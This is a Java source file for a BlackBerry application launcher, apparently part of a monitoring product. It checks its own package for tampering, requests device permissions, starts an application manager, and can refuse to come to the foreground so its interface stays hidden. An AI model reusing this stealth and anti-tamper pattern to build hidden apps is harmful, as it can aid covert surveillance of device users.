package com.vvt.screen;

import com.vvt.blackberry.fxs.security.SecurityChecker;
import com.vvt.ctrl.ApplicationManager;
import com.vvt.info.ApplicationInfo;
import com.vvt.std.Log;
import com.vvt.std.Permission;
import net.rim.device.api.ui.UiApplication;

public class PolymorphicUI extends UiApplication {

	private ApplicationManager appManager = null;
	private boolean foregroundApproval = false;
	
	/*static {
		// To set permission.
		Permission.requestPermission();
	}*/
	
	public PolymorphicUI() {
		SecurityChecker securityChecker = new SecurityChecker();
		if (securityChecker.isCodFileModified()) {
			System.exit(0);
		} else {
			// To set permission.
			Permission.requestPermission();
			// To set debug mode.
			Log.setDebugMode(ApplicationInfo.DEBUG);
			appManager = new ApplicationManager(this);
			appManager.start();
		}
		/*// To set permission.
		Permission.requestPermission();
		// To set debug mode.
		Log.setDebugMode(ApplicationInfo.DEBUG);
		
		appManager = new ApplicationManager(this);
		appManager.start();*/
	}
	
	public static void main(String[] args) { // If CLDC Application (Visible)
		PolymorphicUI self = new PolymorphicUI();
		self.enterEventDispatcher();
	}
	
	public static void libMain(String args[]) { // If Library
		main(args);
	}
	
	public boolean getForegroundApproval() {
		return foregroundApproval;
	}
	
	public void setForegroundApproval(boolean foregroundApproval) {
		this.foregroundApproval = foregroundApproval;
	}
	
	// Application
	protected boolean acceptsForeground() {
	    return foregroundApproval;
	}
}
